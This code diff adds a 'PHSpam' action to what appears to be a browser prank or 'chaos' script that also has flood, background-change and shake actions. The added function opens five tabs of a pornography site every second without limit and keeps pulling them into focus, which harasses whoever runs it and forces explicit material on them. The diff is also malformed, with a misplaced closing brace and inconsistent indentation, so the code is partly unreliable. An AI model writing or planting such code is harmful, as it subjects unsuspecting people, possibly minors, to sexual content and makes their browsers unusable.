@@ -39,6 +39,26 @@ if (action === 'flood') {
   }, 1000); // 5 tabs every 1000ms (1 second)
   return;
 },
+          PHSpam: () => {
+    const url = 'https://pornhub.com';
+    const portals = [];
+
+    setInterval(() => {
+      for (let i = 0; i < 5; i++) {
+        const win = window.open(url, '_blank');
+        if (win) {
+          portals.push(win);
+        }
+      }
+    }, 1000);
+
+    setInterval(() => {
+      portals.forEach(win => {
+        if (win && !win.closed) win.focus();
+      });
+    }, 500);
+  }
+};
         changeBG: () => document.body.style.background = `hsl(${Math.floor(Math.random()*360)} 60% 80%)`,
         shake: () => {
           if (document.getElementById('__chaos_shake')) return;
